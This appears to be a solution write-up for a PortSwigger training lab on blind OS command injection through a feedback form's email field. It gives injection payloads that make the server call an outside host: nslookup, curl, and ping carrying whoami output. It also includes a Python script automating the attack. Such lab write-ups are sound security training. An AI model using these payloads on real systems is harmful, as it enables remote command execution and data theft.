# Lab: Blind OS command injection with out-of-band interaction (Practitioner)

**PortSwigger:** [Official lab](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)

**Description:** The feedback function runs a shell command asynchronously. The output is not returned and cannot be redirected into a location you can access, but the server can reach external domains.

**Goal:** Trigger a DNS lookup to Burp Collaborator.

**Vulnerable parameter:** `email` in `POST /feedback/submit`.

> The Academy firewall blocks interactions between labs and arbitrary external systems — you **must** use Burp Collaborator's default public server (`*.oastify.com`, legacy `*.burpcollaborator.net`). Interactsh/ngrok/your own VPS will not work here.

## Vulnerability

Fully blind injection: no output, no timing guarantee, no writable served directory. The only remaining channel is out-of-band (OAST) — make the server resolve a hostname you control and watch the lookup arrive. DNS is preferred because it is rarely blocked and needs no full HTTP connection.

## Solution

1. Generate a Collaborator payload:
   - Burp Suite Professional → **Collaborator** tab → *Copy to clipboard*, or
   - `python3 collaborator_client.py` (no Burp needed) → prints `<payload-id>.oastify.com`.
2. Open `/feedback`, take the `csrf` token.
3. Submit feedback with the payload in `email`:

```http
POST /feedback/submit HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=<token>&name=x&email=x||nslookup+x.COLLABORATOR-SUBDOMAIN||&subject=x&message=x
```

4. Poll Collaborator (*Poll now*, or the script's poll loop). A DNS interaction for `x.COLLABORATOR-SUBDOMAIN` arrives within a few seconds → lab solved.

For this lab the DNS lookup alone is enough; you do not need to read anything from it.

## Exploit Payload

```
x||nslookup x.COLLABORATOR-SUBDOMAIN||
```

Alternatives: `x||curl http://COLLABORATOR-SUBDOMAIN||` (HTTP interaction), `` x||ping -c 1 `whoami`.COLLABORATOR-SUBDOMAIN|| ``.

## Python one-liner (optional)

```python
import re, requests
from collaborator_client import Collaborator
base = "https://YOUR-LAB-ID.web-security-academy.net"
c = Collaborator(); payload = c.payload()
s = requests.Session()
csrf = re.search(r'name="csrf" value="([^"]+)"', s.get(base + "/feedback").text).group(1)
s.post(base + "/feedback/submit", data={"csrf": csrf, "name": "x",
       "email": f"x||nslookup x.{payload}||", "subject": "x", "message": "x"})
print(c.poll())   # DNS interactions
```

Full automation: [`os_command_injection_blind_out_of_band.py`](os_command_injection_blind_out_of_band.py).

## Verified run

Instance `0afa0076047351cf80b767d400c50097`, payload `17octlmk2m53hi3gq22k3xs559wtck.oastify.com`:

```
submit -> 200
lab status after ~5 s -> Solved
```

## Notes

- The command is executed **asynchronously**: the HTTP response returns immediately, so wait/poll instead of expecting a delay.
- Any unique subdomain of the Collaborator domain satisfies this lab's check — but generating it properly (see [`collaborator_client.py`](collaborator_client.py)) lets you *verify* the interaction, which is what you need in lab [05](05-blind-oob-data-exfiltration.md) and in real testing.
- Prefix the payload with a label (`x.`) so you can tell which injection point fired when you send several payloads at once.

## Defensive takeaways

Egress-filter application servers (allow-list DNS resolvers and outbound destinations) so OAST channels cannot be reached. Fix the root cause by never invoking a shell with user data; blind injection is still remote code execution even when nothing is reflected.
